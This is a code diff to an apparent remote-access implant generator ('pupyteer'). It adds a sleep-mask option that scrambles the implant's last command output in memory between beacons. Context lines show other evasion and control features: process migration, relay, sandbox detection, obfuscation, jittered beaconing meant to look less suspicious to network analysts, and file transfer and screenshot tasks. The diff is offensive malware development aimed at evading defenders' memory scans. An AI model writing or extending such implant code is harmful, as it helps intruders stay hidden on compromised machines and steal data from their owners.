@@ -53,6 +53,11 @@ except ImportError:  # pragma: no cover - fallback if jinja2 is missing
 
 logger = logging.getLogger("pupyteer.agent.stub")
 
+try:  # the mask block is rendered into the template; optional at import time
+    from pupyteer.agent.core.sleep_mask import STANDALONE_MASK_SOURCE
+except Exception:  # pragma: no cover - a stub build must not hard-depend on it
+    STANDALONE_MASK_SOURCE = ""
+
 
 # --------------------------------------------------------------------------- #
 #  Configuration dataclass
@@ -84,6 +89,12 @@ class StubConfig:
     migration: bool = True
     relay: bool = False                # Named-pipe / TCP P2P relay
     anti_analysis: bool = False        # VM / sandbox detection
+    # Mask the last command output in memory while the agent sleeps. Off by
+    # default like the other footprint-changing options: it costs a little CPU
+    # per beacon and is only worth it when the target is expected to be
+    # scanned. Masks a caller-supplied buffer only — see sleep_mask.py for why
+    # it cannot mask the interpreter's own image.
+    sleep_mask: bool = False
     obfuscation: Optional[str] = None  # "none" | "light" | "medium" | "heavy" | path-to-module
     # RC4 transport key. Empty is legitimate and is the default: it selects the
     # plaintext wire (no RC4 framing), which is also the listener's default.
@@ -299,6 +310,8 @@ class AgentStubGenerator:
             "migration": cfg.migration,
             "relay": cfg.relay,
             "anti": cfg.anti_analysis,
+            "sleep_mask": cfg.sleep_mask,
+            "mask_source": STANDALONE_MASK_SOURCE if cfg.sleep_mask else "",
             "is_win": cfg.platform == "windows",
             "is_linux": cfg.platform == "linux",
             "is_mac": cfg.platform == "macos",
@@ -2470,6 +2483,25 @@ def start_relay():
 #  Beacon loop
 # --------------------------------------------------------------------- #
 
+{% if sleep_mask %}{{ mask_source }}{% endif %}def _sleep_masked(duration: float):
+    """Sleep for *duration*, with the output buffer masked for that window.
+
+    The restore is in a `finally` so an interrupted sleep cannot leave the
+    buffer scrambled — a payload that loses its own output buffer is a payload
+    that stops answering. Without the sleep-mask build option this is a plain
+    sleep, and no mask state exists.
+    """
+{% if sleep_mask %}
+    if _MASK_BUF:
+        try:
+            _mask_bytes(_MASK_BUF, _MASK_KEY)
+            _t.sleep(duration)
+        finally:
+            _mask_bytes(_MASK_BUF, _MASK_KEY)
+        return
+{% endif %}
+    _t.sleep(duration)
+
 def _jittered_sleep(base: float, jitter_pct: int):
     """Sleep for base * (1 +/- jitter_pct/100) with triangular distribution.
     
@@ -2478,13 +2510,13 @@ def _jittered_sleep(base: float, jitter_pct: int):
     to network analysts than uniform jitter.
     """
     if jitter_pct <= 0:
-        _t.sleep(base)
+        _sleep_masked(base)
         return
     delta = base * (jitter_pct / 100.0)
     # Triangular distribution: peak at base, tails at +/- delta
     low = base - delta
     high = base + delta
-    _t.sleep(_rnd.triangular(low, base, high))
+    _sleep_masked(_rnd.triangular(low, base, high))
 
 def _dispatch(task: dict) -> dict:
     """Route a server task to the right module handler.
@@ -2685,8 +2717,12 @@ def _run_command(text: str) -> str:
     if task.get("action") in ("fs_get", "fs_put", "screenshot"):
         # Binary replies carry base64 that the operator parses whole; clipping
         # it mid-stream yields corrupt data. They bound themselves instead.
-        return _render_result(result)
-    return _clip(_render_result(result))
+        rendered = _render_result(result)
+        {% if sleep_mask %}_remember_output(rendered){% endif %}
+        return rendered
+    rendered = _clip(_render_result(result))
+    {% if sleep_mask %}_remember_output(rendered){% endif %}
+    return rendered
 
 
 def _render_result(result) -> str:
